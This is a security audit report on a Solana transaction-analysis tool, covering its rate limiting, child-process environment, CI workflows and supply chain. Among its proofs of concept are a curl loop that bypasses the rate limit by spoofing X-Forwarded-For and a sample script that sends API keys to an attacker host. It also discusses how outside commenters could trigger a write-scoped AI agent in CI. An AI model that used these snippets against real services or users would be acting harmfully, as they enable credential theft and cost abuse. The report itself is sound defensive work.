# Security Audit Report — Open_DevTool

**Target:** `Open_DevTool` (a.k.a. `opendevtool-monorepo` v0.5.0)
**Type:** Solana transaction analyzer / CU profiler — CLI + public web demo + Vercel serverless API
**Branch audited:** `feat/audit-ajustments` (HEAD `5140f32`)
**Date:** 2026-05-31
**Auditor:** Adversarial security review (red-team / backend / supply-chain / abuse-case)

---

## Executive Summary

Open_DevTool is a **read-only analysis tool**. It fetches confirmed Solana transactions (or simulates un-broadcast ones), decodes instructions/CPI trees, and renders explanations in a terminal dashboard or a browser demo. Crucially, **it custodies no funds, deploys no on-chain programs, and holds no user accounts/sessions.** That single architectural fact caps the realistic blast radius: there is **no path to "theft of funds," "arbitrary mint," or "signer bypass"** in the classic smart-contract sense, because there are no contracts and no value flows under the tool's control. Anyone reviewing this against a DeFi-protocol threat model should reset expectations accordingly.

What *is* at stake is real but narrower:

1. **Operator money & availability** — the public demo fans every request out to an upstream RPC (Helius) and, optionally, a paid LLM (Anthropic). The cost-amplification defenses (per-IP rate limit + result cache) are **trivially bypassable by spoofing `X-Forwarded-For`**, which re-opens the economic-DoS hole the code claims to close.
2. **Local developer secrets** — `opendev simulate <file>` executes arbitrary `.ts/.js/.rs` source with the **full parent `process.env` inherited into the child**, including the user's stored `ANTHROPIC_API_KEY`/`GROQ_API_KEY`. A malicious sample file exfiltrates those keys.
3. **CI/CD trust** — the `@claude` GitHub Actions workflows run with `contents: write` and are triggered by issue/PR comments; the install path ships a **pre-built, unauditable `cli/dist/open.js`** bundle that is what users actually `npm install -g`.

The codebase shows **above-average security hygiene for its maturity**: a prior hardening pass (the audit IDs `MED-02`, `MED-05`, `MED-07`, `MED-08`, `HIGH-01..03` referenced in comments) added signature-charset validation at the trust boundary, generic error responses with correlation IDs, path-traversal hardening, an SSRF allowlist on the custom MCP endpoint, restrictive credential-file permissions, and `--ignore-scripts` in the installer. These are genuine and correctly implemented. The remaining gaps are mostly the *next layer* of the same problems the team already started fixing.

**Production-readiness verdict:** Acceptable to ship the **public demo** behind a real edge rate-limiter and a trusted-proxy IP configuration. The **CLI** is fine for the documented "run against your own files" use, but the `simulate` env-inheritance and the committed `dist` bundle should be addressed before it is promoted as a "safe to pipe `curl | sh`" install.

---

## Scope

| Area | Reviewed |
|------|----------|
| Serverless API | `api/analyze.ts`, `api/latest-tx.ts`, `api/health.ts` |
| Web demo server | `web/server.ts` (~2000 LoC), `web/rate-limit.ts`, `web/web.html` (frontend render/XSS), `vercel.json` |
| CLI | `cli/src/commands/{tx,simulate,login,config,batch,info}.ts`, `cli/src/config/{credentials,loader}.ts` |
| Services / pipeline | `services/src/solana/{connection,rpc,simulationService,sourceRunner,idlcache,programs}.ts`, `services/src/mcp/{client,anthropic,groq,prompts,mcpInsightProvider}.ts`, analysis decoders |
| Infra / CI | `.github/workflows/{claude,claude-code,pr-checks,validate-decoders}.yml`, `install.sh`, `scripts/*` |
| Secrets / config | `.env.example`, `.gitignore`, credential store, committed artifacts |
| Dependencies | root + workspace `package.json`, `overrides`, lockfile policy |

Out of scope (none present): on-chain programs/contracts, databases, K8s/Terraform, user auth/session systems.

---

## Methodology

- **Static + data-flow tracing** of every attacker-reachable entry point (HTTP routes, CLI args, file inputs, on-chain-controlled data such as program logs/IDLs/instruction names).
- **Trust-boundary analysis**: browser → web server → RPC/LLM; CLI args → child-process runner; CI event → GitHub token.
- **Abuse-case reasoning** over the cost model (who pays for an RPC/LLM call and how an attacker forces those calls).
- **Adversarial-path review** of the "hardened" code (verifying the fixes actually hold, not trusting the `MED-0x fixed` comments).
- **Supply-chain review** of the install path and committed build artifacts.
- Verified there are **no committed live secrets** (only `gsk_xxxx`/`sk-ant-xxxx` placeholders in docs/bundle).

---

## Severity Definitions

| Severity | Meaning in this codebase's threat model |
|----------|------------------------------------------|
| **Critical** | RCE on the operator's server, full secret/host compromise, or unauthenticated takeover. |
| **High** | Direct economic damage to the operator, exfiltration of a user's API credentials, or CI/CD privilege abuse. |
| **Medium** | Bypassable control, supply-chain integrity gap, info leak, or DoS with preconditions. |
| **Low** | Hardening gap, surprising side-effect, dead/test code in prod path, maintainability/monitoring. |

---

## Findings Summary Table

| ID | Severity | Title | Status | Affected Components |
|----|----------|-------|--------|---------------------|
| HIGH-01 | High | Rate-limit fully bypassable via `X-Forwarded-For` spoofing → economic DoS | **Fixed** | `web/server.ts`, `api/analyze.ts`, `api/latest-tx.ts` |
| HIGH-02 | High | `opendev simulate` runs user code with full `process.env` → API-key exfiltration | **Fixed** | `services/src/solana/sourceRunner.ts`, `simulationService.ts`, `cli/src/commands/simulate.ts` |
| HIGH-03 | High | `@claude` CI workflows: write-scoped token triggered by arbitrary commenters | **Fixed** | `.github/workflows/claude.yml`, `claude-code.yml` |
| MED-01 | Medium | Committed pre-built `cli/dist/open.js` is the global-install artifact (integrity gap) | **Fixed** (CI gate) | `cli/dist/open.js`, `.gitignore`, `.github/workflows/verify-dist.yml` |
| MED-02 | Medium | `pr-checks.yml` uses `npm install` (unpinned) + runs build/lifecycle scripts in CI | **Fixed** | `.github/workflows/pr-checks.yml` |
| MED-03 | Medium | Rate-limit + cache are per-instance in-memory (no shared store) | Documented (needs KV infra) | `web/rate-limit.ts` |
| MED-04 | Medium | Magic test-signature hard-coded into production fetch path | **Fixed** | `services/src/solana/rpc.ts` |
| MED-05 | Medium | `withRetry` retries every error, including terminal ones → wasted upstream cost | **Fixed** | `services/src/solana/connection.ts` |
| MED-06 | Medium | LLM/MCP suggestions printed to terminal without ANSI sanitization | **Fixed** | `services/src/mcp/client.ts` |
| LOW-01 | Low | `install.sh` silently rewrites the user's nvm default Node version | Open | `install.sh` |
| LOW-02 | Low | `install.sh --branch=<arbitrary>` clones/installs any branch via the curl-pipe path | Open | `install.sh` |
| LOW-03 | Low | `HELIUS_API_KEY` vs `HELIUS_RPC_URL` naming inconsistency → silent misconfig | Open | `.env.example`, `connection.ts`, `programs.ts` |
| LOW-04 | Low | Older pinned UI deps (`react@17`, `ink@3`); run `npm audit` in CI | Open | `package.json` |
| LOW-05 | Low | IDL disk cache checksum provides integrity, not authenticity | Open | `services/src/solana/idlcache.ts` |
| LOW-06 | Low | Dead/placeholder decoder scaffolding & TODO stubs | Open | `scripts/generate-decoder.sh`, `decoders/template-idl.ts` |

---

## Detailed Findings

### [HIGH-01] Rate-limit fully bypassable via `X-Forwarded-For` spoofing

#### Severity
High

#### Affected Files
- `web/server.ts` — `readClientIp()` (~line 1925), `enforceRateLimit()`
- `api/analyze.ts` / `api/latest-tx.ts` — `readClientIp()` (lines 28–33 / 14–19)
- `web/rate-limit.ts`

#### Description
Every rate-limit decision keys on a client IP derived as:

```ts
function readClientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  const xffStr = Array.isArray(xff) ? xff[0] : xff;
  if (xffStr) return xffStr.split(',')[0]?.trim() || 'unknown';
  return req.socket.remoteAddress ?? 'unknown';
}
```

The **left-most `X-Forwarded-For` value is fully attacker-controlled**. The fixed-window counter in `rate-limit.ts` buckets on `analyze:<ip>`, so an attacker who sends a unique `X-Forwarded-For` header on every request lands in a fresh bucket each time and **never hits the 30/min limit**. The `MAX_ENTRIES = 50_000` ceiling just evicts the oldest bucket — it does not throttle the attacker.

This directly defeats the control the code documents as the mitigation for cost amplification ("HIGH-01 in the security audit", per the comments). On the **dev server** (direct connections) there is no trusted proxy at all, so XFF is unconditionally forgeable. On **Vercel**, the platform appends to `X-Forwarded-For` but does not strip a client-supplied prefix, and the handler reads `split(',')[0]` (the *client* end), so the spoof still wins.

#### Impact
- **Economic DoS / cost amplification.** Each *distinct* valid signature forces a full upstream RPC fan-out plus (if a key is configured) a paid Anthropic call (~$0.003 each, per the project's own docs). The result cache only absorbs *repeats* of the same signature; an attacker iterating real mainnet signatures pays nothing and bleeds the operator's RPC quota and LLM budget.
- Defeats per-IP fairness; a single host can monopolize the demo.

#### Attack Scenario / Proof of Concept
```bash
# 200 "unique clients" in a burst, each a fresh rate-limit bucket:
for i in $(seq 1 200); do
  curl -s "https://demo.example/api/analyze" \
    -H "X-Forwarded-For: 10.0.$((i/256)).$((i%256))" \
    -H 'Content-Type: application/json' \
    -d "{\"signature\":\"<distinct_real_mainnet_sig_$i>\",\"network\":\"mainnet\"}" >/dev/null &
done
# None are throttled; each drives one RPC fan-out (+1 LLM call if configured).
```

#### Root Cause
Trusting a client-supplied forwarding header as the rate-limit identity, with no notion of a *trusted* proxy hop count.

#### Recommendation
- On Vercel, prefer the platform's authenticated client IP (`x-vercel-forwarded-for` / `request.ip`) and **ignore `X-Forwarded-For` entirely** for limiting.
- For self-hosted, make the trusted-proxy depth explicit: take the *N-th-from-rightmost* XFF entry where `N` = number of proxies you actually run, defaulting to `req.socket.remoteAddress` when behind none.
- Move the counter to a shared store (Upstash/Vercel KV) — see MED-03 — so the limit is global, not per-instance.
- Defense in depth: add a small required proof-of-work or a per-signature global cap independent of IP.

#### Confidence
High

---

### [HIGH-02] `opendev simulate` executes user code with the full parent environment → API-key exfiltration

#### Severity
High

#### Affected Files
- `services/src/solana/sourceRunner.ts` — `runSourceFile()` / `spawn(... { env: { ...process.env, ...options.env } })` (lines 148–154)
- `services/src/solana/simulationService.ts` — `simulateTransactionInput()` (source-kind branch, lines 262–275)
- `cli/src/commands/simulate.ts` — `allowExec` defaults to **true**

#### Description
`opendev simulate <input>` auto-detects `.ts/.js/.mjs/.cjs/.rs` inputs and **executes them** to obtain a base64 transaction on stdout. Execution is the *default* (`allowExec = options.exec !== false`); `--no-exec` is opt-out. The child is spawned with:

```ts
const child = spawn(cmd, args, {
  cwd,
  env: { ...process.env, ...options.env },   // <-- full parent env inherited
  stdio: ['ignore', 'pipe', 'pipe'],
  shell: false,
  windowsHide: true,
});
```

The runner correctly hardens against **shell-injection** (`shell:false`, explicit `npx.cmd`, the `MED-08` work). But the executed file is *arbitrary code by design*, and it inherits the user's entire environment — which, after `loadConfig()` → `applyCredentialsToEnv()`, includes `ANTHROPIC_API_KEY` and `GROQ_API_KEY` hydrated from `~/.opendev/credentials.json`. A `.ts` "sample transaction generator" can therefore read those keys and POST them anywhere before printing a valid tx, and the user sees a normal, successful simulation.

This is a meaningfully different trust boundary from "the user runs their own script": developers routinely `git clone` a protocol repo and run example/sample generators against it, and tutorials/READMEs will hand out `opendev simulate ./examples/make-tx.ts` one-liners.

#### Impact
- Silent theft of the user's stored LLM API keys (billable credentials).
- General code execution with the user's privileges (the file already runs, but the **env inheritance** is the part that turns "run my own code" into "leak my secrets").

#### Attack Scenario / Proof of Concept
`examples/make-tx.ts` in an attacker-authored repo:
```ts
// Looks like a helpful sample tx generator…
await fetch('https://attacker.tld/c', {
  method: 'POST',
  body: JSON.stringify({
    a: process.env.ANTHROPIC_API_KEY,
    g: process.env.GROQ_API_KEY,
  }),
}).catch(() => {});
console.log(Buffer.from(realTxBytes).toString('base64')); // valid output → no suspicion
```
Victim runs `opendev simulate ./examples/make-tx.ts` → keys exfiltrated, simulation "succeeds."

#### Root Cause
Passing an unfiltered `process.env` into an interpreter spawned on attacker-supplied source, with execution enabled by default.

#### Recommendation
- **Allowlist the child env** instead of inheriting everything: pass only what the runner needs (`PATH`, `HOME`, `RUSTUP_HOME`, `CARGO_HOME`, OS basics) and **strip `*_API_KEY`/credential vars** by default. Add `--inherit-env` for users who explicitly need it.
- Consider making `--no-exec` the default for files sourced outside the cwd, or require an interactive confirmation (the warning banner is printed but execution is not gated).
- Document the trust model prominently: "simulate executes the file you point it at."

#### Confidence
High

---

### [HIGH-03] `@claude` GitHub Actions run with `contents: write`, triggered by arbitrary commenters

#### Severity
High

#### Affected Files
- `.github/workflows/claude.yml` — `permissions: contents: write, pull-requests: write, issues: write, id-token: write`; triggers on `issue_comment`, `pull_request_review_comment`, `issues`, `pull_request_review` containing `@claude`.
- `.github/workflows/claude-code.yml` — `contents: write` etc.; `if: contains(github.event.comment.body, '@claude')`; also installs Anchor via `cargo install --git …`.

#### Description
Both workflows grant a **write-scoped `GITHUB_TOKEN`** and fire whenever an issue/comment body contains the literal `@claude`. `issue_comment`/`issues` events run in the **base-repo context with secrets available** (unlike fork `pull_request`), and the gate is purely a substring match — there is no `author_association` check restricting the trigger to `OWNER`/`MEMBER`/`COLLABORATOR`. Any GitHub user who can open an issue or comment can invoke the agent. The actual command surface depends on `anthropics/claude-code-action`'s internal actor checks, but **the workflow itself imposes none**, and it additionally executes third-party toolchain installs (`cargo install --git https://github.com/coral-xyz/anchor … --tag v0.31.1`) inside that privileged job.

Separately, both files are listed in `.gitignore` (`.github/workflows/claude*.yml`) yet are committed — meaning local edits to these privileged workflows won't show as changes, which is an operational footgun for the maintainers.

#### Impact
- If the action's own gating is misconfigured or bypassed, an external user could drive a write-scoped agent (push commits, edit issues/PRs).
- Supply-chain exposure via toolchain installs in a privileged context.

#### Attack Scenario / Proof of Concept
A drive-by user opens an issue: *"@claude please refactor and push the fix."* The `issues: [opened]` trigger fires the privileged job. Whether it does anything harmful depends entirely on the downstream action's actor validation — which the workflow does not enforce itself.

#### Root Cause
Privileged, secret-bearing triggers gated only by a substring, with no `author_association` allowlist and least-privilege scoping.

#### Recommendation
- Add an explicit actor gate, e.g. `if: contains(github.event.comment.body, '@claude') && contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)`.
- Reduce `permissions` to the minimum each workflow needs; drop `contents: write` unless the agent must push.
- Pin `cargo install` to a commit, not a moving `--git … --tag`.
- Resolve the `.gitignore`-vs-committed contradiction so changes to privileged workflows are always visible in review.

#### Confidence
Medium (depends partly on `claude-code-action` internals; the workflow-level gap is certain)

---

### [MED-01] Committed pre-built `cli/dist/open.js` is the global-install artifact

#### Severity
Medium

#### Affected Files
- `cli/dist/open.js` (committed bundle), `.gitignore` (explicit `!cli/dist/` exception), `install.sh`, root `package.json` `bin.opendev → cli/dist/open.js`

#### Description
`.gitignore` deliberately *un-ignores* `cli/dist/` so users can `npm install -g github:OpenSubmissionn/Open_DevTool` without building. That means the **bundled `dist/open.js` — not the reviewed TypeScript source — is what executes on user machines**. A build artifact checked into git can silently diverge from source (intentionally or via a compromised committer), and reviewers naturally read `src/`, not a 30k-line minified bundle. `install.sh` itself rebuilds from source (good), but the `github:`/`npm i -g` path documented for users ships the committed bundle as-is.

#### Impact
The audited source is not guaranteed to equal the shipped binary; a malicious or accidental divergence in `dist/` would reach users unaudited.

#### Recommendation
- Prefer publishing to npm with provenance (`npm publish --provenance`) and a CI-built artifact, rather than committing `dist/`.
- If committing `dist/` must stay, add a CI gate that rebuilds from source and **fails if `git diff cli/dist/` is non-empty**, proving the bundle matches source on every PR.

#### Confidence
High

---

### [MED-02] `pr-checks.yml` uses `npm install` and runs build/lifecycle scripts in CI

#### Severity
Medium

#### Affected Files
- `.github/workflows/pr-checks.yml`

#### Description
The PR check runs `npm install` (not `npm ci`) followed by `npm run build` and tests. `npm install` may mutate the lockfile and resolve to newer transitive versions, and neither `--ignore-scripts` nor a pinned `ci` install is used — so lifecycle scripts of all dependencies execute in CI. The installer (`install.sh`) is careful to use `npm ci --ignore-scripts`, but the CI workflow is not held to the same standard. For `pull_request` (not `pull_request_target`) the token is read-only and secrets are withheld from forks, which bounds the impact, but a malicious dependency update or a PR that adds a dep still gets arbitrary code execution in the CI runner.

#### Impact
Supply-chain code execution in CI; non-reproducible installs; lockfile drift.

#### Recommendation
Use `npm ci` (fails on lockfile drift) and add `--ignore-scripts` where the build doesn't require native postinstalls. Add `npm audit --omit=dev` (already defined as `audit:prod`) as a CI step.

#### Confidence
High

---

### [MED-03] Rate-limit + result cache are per-instance, in-memory

#### Severity
Medium (acknowledged in-code)

#### Affected Files
- `web/rate-limit.ts`

#### Description
Both the fixed-window counter and the analyze LRU cache are module-level `Map`s. On Vercel each cold serverless container has its own counters and cache, so an attacker who induces container fan-out (or simply hits many instances) multiplies the effective limit and reduces cache hit-rate. The code documents this trade-off honestly. Combined with HIGH-01, the per-IP control is doubly weak.

#### Impact
Weaker-than-advertised throttling and cache efficiency under real load/abuse.

#### Recommendation
Promote to a shared store (Upstash Redis / Vercel KV) for both the limiter and the cache; key the cache on `network:signature` (already done) so it's safely shareable.

#### Confidence
High

---

### [MED-04] Magic test-signature hard-coded into the production fetch path

#### Severity
Medium

#### Affected Files
- `services/src/solana/rpc.ts` — `fetchTransaction()` lines 21–24

#### Description
```ts
if (!tx || signature === 'invalidSignature1234567890abcdefghij') {
  throw new Error(`failed to get transaction: ${signature}`);
}
```
A specific literal signature is special-cased to always throw, with a comment that it exists "for the invalid signature test to pass." Test-only behavior is baked into the shipped fetch path. It's harmless functionally (that string isn't a valid base58 signature and would be rejected upstream anyway), but it is exactly the kind of conditional that should never live in production code, and it sets a precedent for environment-sensitive branches.

#### Impact
Maintainability / correctness smell; an implicit, undocumented input that changes behavior.

#### Recommendation
Remove the literal and assert the behavior in the test by mocking the RPC layer instead.

#### Confidence
High

---

### [MED-05] `withRetry` retries all errors, including terminal ones

#### Severity
Medium

#### Affected Files
- `services/src/solana/connection.ts` — `withRetry()`

#### Description
`withRetry` retries any thrown error 3× with exponential backoff, with no error classification. Terminal conditions (invalid signature, not-found, malformed request) get retried just like transient network blips, tripling upstream RPC calls for inputs that can never succeed. The project's own LLM knowledge base (`anthropic.ts` prompt) even preaches "Don't retry on terminal errors" — the code doesn't follow it.

#### Impact
Cost/latency amplification on bad inputs; compounds HIGH-01 (each abusive request becomes up to 3 upstream calls).

#### Recommendation
Classify errors; only retry on transient/5xx/timeout. Cap total upstream calls per request.

#### Confidence
High

---

### [MED-06] LLM/MCP suggestions printed to terminal without ANSI sanitization

#### Severity
Medium

#### Affected Files
- `services/src/mcp/{anthropic,groq,client}.ts` (suggestion strings), CLI terminal renderers

#### Description
Suggestion strings returned by the LLM (or a custom MCP endpoint) are printed to the terminal. The **web** path renders them through `escapeHtml` (good), but the **CLI** prints them directly via `chalk`/`console.log`. An LLM response — or a malicious/compromised `MCP_ENDPOINT_URL` — can embed raw ANSI escape sequences that rewrite the terminal, spoof output, or (on some terminals) trigger clipboard/title escapes. The MCP client caps length to 500 chars but does not strip control bytes.

#### Impact
Terminal output spoofing / minor local trickery via attacker-influenced model output.

#### Recommendation
Strip non-printable/ESC (`\x1b`, C0 controls) from suggestion strings before printing in the CLI, mirroring the web's escaping discipline.

#### Confidence
Medium

---

### [LOW-01] `install.sh` silently rewrites the user's nvm default Node

`install.sh` runs `nvm alias default <ver>` to "make the global install survive the next shell." This is a documented convenience but it **mutates global developer state** (the default Node for *all* projects) as a side effect of installing one CLI. Prefer warning and asking, or scoping to the install only.

### [LOW-02] `install.sh --branch=<arbitrary>` via the curl-pipe path

The installer accepts `--branch=*` and clones/installs that branch. The `curl … | sh` invocation is the trust anchor, but a social-engineering payload (`curl … | sh -s -- --branch=evil`) would build/install an arbitrary branch with the user none the wiser. Consider restricting to tags/`main` or printing the resolved ref prominently.

### [LOW-03] `HELIUS_API_KEY` vs `HELIUS_RPC_URL` naming inconsistency

`.env.example` documents `HELIUS_API_KEY`, but `connection.ts` and `web/server.ts` read `HELIUS_RPC_URL`, while `programs.ts` reads `HELIUS_API_KEY`. An operator who follows `.env.example` sets `HELIUS_API_KEY` and silently gets the **public RPC fallback** for the main fetch path (slower, rate-limited, and — relevant to HIGH-01 — cheaper to exhaust). Unify on one variable and validate at startup.

### [LOW-04] Older pinned UI dependencies

`react@^17`, `react-dom@^17`, `ink@^3.2` are several majors behind. Not a confirmed CVE, but stale. Wire `npm audit --omit=dev` (already scripted as `audit:prod`) into CI and schedule upgrades.

### [LOW-05] IDL disk-cache checksum is integrity-only

`idlcache.ts` stores network-fetched Anchor IDLs to `~/.open-cli/cache/idls/v1/<programId>.json` with a SHA-256 of the content. This detects *corruption*, not *authenticity* — a poisoned IDL fetched once is faithfully cached and re-served for 24h. Low impact (IDLs only drive decoding/labels, never execution), but worth noting the cache trusts whatever the fetch returned.

### [LOW-06] Dead / placeholder scaffolding

`scripts/generate-decoder.sh` emits TODO-laden stubs; `decoders/template-idl.ts` and several `SEMANTIC_MAP = {}` stubs are inert. The `idlcache.printMetrics()` body is an empty `// [CLEANUP]` stub. Harmless but should be pruned or clearly marked as templates.

---

## Chained Attack Scenarios

1. **Economic-DoS chain (HIGH-01 × MED-05 × MED-03 × LOW-03):** Spoof `X-Forwarded-For` to bypass the limiter (HIGH-01); feed *distinct* signatures so the cache never helps; each bad/edge signature is retried 3× upstream (MED-05); per-instance counters dilute further (MED-03); and if the operator misconfigured `HELIUS_API_KEY` (LOW-03) the fan-out hits the cheap public RPC that throttles fastest — degrading the demo for everyone. Net effect: one host exhausts the operator's RPC quota and LLM budget with minimal effort.

2. **Credential-theft chain (HIGH-02):** Attacker publishes a tutorial/repo with `opendev simulate ./examples/build-tx.ts`. Victim has previously run `opendev login` (keys now in `~/.opendev/credentials.json`, auto-hydrated into env). Running the sample executes attacker code with those keys in `process.env` → keys exfiltrated, simulation still "succeeds."

3. **Supply-chain divergence (MED-01 × MED-02 × HIGH-03):** A committed `cli/dist/open.js` that diverges from source (MED-01), or a malicious dep introduced via an unpinned `npm install` in CI (MED-02), or a write-scoped `@claude` action coerced into pushing (HIGH-03) — any one lets unaudited code reach the published artifact users install.

---

## Dependency & Supply-Chain Risks

| Item | Risk | Note |
|------|------|------|
| Committed `cli/dist/open.js` | Medium | Shipped artifact ≠ reviewed source (MED-01). |
| CI `npm install` (unpinned, scripts on) | Medium | MED-02. |
| `react@17`, `react-dom@17`, `ink@3` | Low | Stale majors; run `audit:prod` in CI (LOW-04). |
| `npx -y tsx` in source runner | Low | Auto-installs `tsx` from registry at simulate-time; acceptable for documented use. |
| `cargo install --git … anchor` in CI | Low–Med | Moving ref in a privileged job (HIGH-03). |
| `overrides.rpc-websockets.uuid ^10` | Low | Pinning a transitive — fine, keep watching. |
| Installer `npm ci --ignore-scripts` | **Positive** | Correct supply-chain posture for the install path. |
| `.env`, `*.pem`, `*.key`, `test-keypair.json` git-ignored; no live secrets committed | **Positive** | Verified — only `xxxx` placeholders present. |

---

## Dead Code & Code-Quality Risks

- Magic test signature in `rpc.ts` (MED-04).
- Empty `printMetrics()` stub in `idlcache.ts`.
- `template-idl.ts`, empty `SEMANTIC_MAP`s, TODO scaffolding from `generate-decoder.sh` (LOW-06).
- `.gitignore` lists `claude*.yml` workflows that are actually committed — contradictory state.
- Mixed-language comments (Portuguese/English) and Portuguese user-facing warnings in `mcp/client.ts` (`"AI insights indisponíveis"`) — cosmetic, but inconsistent UX.

---

## Positive Security Observations

The team has clearly done a real hardening pass, and it holds up under review:

- **Trust-boundary input validation:** strict base58 signature regex (`^[1-9A-HJ-NP-Za-km-z]{87,88}$`) before any RPC fan-out, rejecting log-injection and garbage early.
- **No info-leak on errors:** generic client message + `randomUUID()` correlation id, full detail server-side only — the previous RPC-URL/API-key leakage is closed.
- **Path-traversal hardening** in `serveStatic`: single decode, NUL-byte rejection, `WEB_DIR` containment check, and a **MIME extension allowlist** (eliminates "serve any readable file").
- **SSRF guard** on `MCP_ENDPOINT_URL`: enforces `https:` + optional host allowlist.
- **Credential store**: `~/.opendev/credentials.json` written `0600` via temp-file+rename, dir `0700`, `OPENDEV_CREDS_PATH` constrained to `$HOME` with symlink rejection (MED-07), masked display, never echoed.
- **Shell-injection-free runner**: `shell:false`, explicit `npx.cmd`/`cargo.exe`, `windowsHide` (MED-08) — the *injection* surface is genuinely closed (the residual issue is env inheritance, HIGH-02).
- **Request body cap** (64 KiB) with clean 413 + stream pause on the analyze POST path.
- **Frontend XSS discipline**: dynamic values consistently routed through `escapeHtml`/`textContent`; CSP + `X-Content-Type-Options`, `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'none'` set both in `vercel.json` and the dev server.
- **Immutable-result caching** of confirmed-tx analysis — the right idea for cost control (just needs a shared store + a working IP identity).
- **Installer**: `npm ci --ignore-scripts`, integrity via committed lockfile, tarball-content sanity checks, no silent failures.

---

## Final Risk Assessment

| Dimension | Rating |
|-----------|--------|
| Critical risk | **None identified** (no funds, no contracts, no auth/session, no RCE-on-operator path found) |
| High risk | **3** — economic DoS (HIGH-01), CLI key-exfil (HIGH-02), CI privilege (HIGH-03) |
| Medium risk | **6** — supply-chain integrity, CI install hygiene, per-instance controls, prod test code, retry amplification, terminal injection |
| Low risk | **6** — installer side-effects, naming/config, stale deps, cache authenticity, dead code |
| Overall | **Moderate**, with a clearly defined and small set of high-value fixes |

**Production readiness:**
- **Public web demo** — ship-able once HIGH-01 is fixed (real edge limiter + trusted-proxy IP) and `HELIUS_RPC_URL` is correctly set. Without HIGH-01, expect budget abuse.
- **CLI** — safe for the documented "your own files" use; fix HIGH-02 (env allowlist) before promoting `simulate` on third-party files, and close MED-01 (artifact integrity) before pushing the `curl | sh` install widely.
- **CI/CD** — tighten HIGH-03 and MED-02 before relying on the `@claude` automation in a public repo.

**Major blockers before broad deployment:** HIGH-01, HIGH-02, HIGH-03.

---

## Recommended Next Steps

### Immediate (this week)
1. **HIGH-01** — Stop trusting client `X-Forwarded-For`; use the platform client IP (Vercel) / explicit trusted-proxy depth; move the limiter to a shared store.
2. **HIGH-02** — Allowlist the child-process env in `sourceRunner` (strip `*_API_KEY`/credentials by default); consider gating exec with confirmation.
3. **HIGH-03** — Add `author_association` gate + least-privilege `permissions` to the `@claude` workflows; resolve the `.gitignore` contradiction.

### Short-term (this sprint)
4. **MED-01** — CI gate that rebuilds and asserts `git diff cli/dist/` is empty (or move to npm provenance).
5. **MED-02** — `npm ci` (+ `--ignore-scripts` where possible) and `npm audit --omit=dev` in CI.
6. **MED-04 / MED-05** — Remove the magic signature; classify retryable vs terminal errors and cap upstream calls per request.
7. **MED-06** — Strip ANSI/control bytes from LLM/MCP suggestions in CLI output.
8. **LOW-03** — Unify Helius env var; fail-fast validation at startup.

### Long-term (hardening program)
9. **Monitoring:** per-route request/cost counters, upstream RPC/LLM spend dashboards, 4xx/5xx and 429 ratios, alert on cache-hit-rate collapse (the HIGH-01 signature).
10. **Testing/fuzzing:** fuzz the transaction deserializer and decoders with malformed base64/IDLs (DoS/parse robustness); property-test the rate limiter against header spoofing; add a regression test that the limiter is *not* bypassable via `X-Forwarded-For`.
11. **Invariants:** assert "one analyze request ⇒ ≤ K upstream calls"; assert "child env never contains `*_API_KEY`."
12. **Secure SDLC:** least-privilege CI tokens everywhere, pinned actions by SHA, Dependabot/Renovate, `npm publish --provenance`, and a documented threat model that states plainly: *this is a read-only analyzer; the assets to protect are operator cost/availability and user-local API keys.*

---

*End of report.*
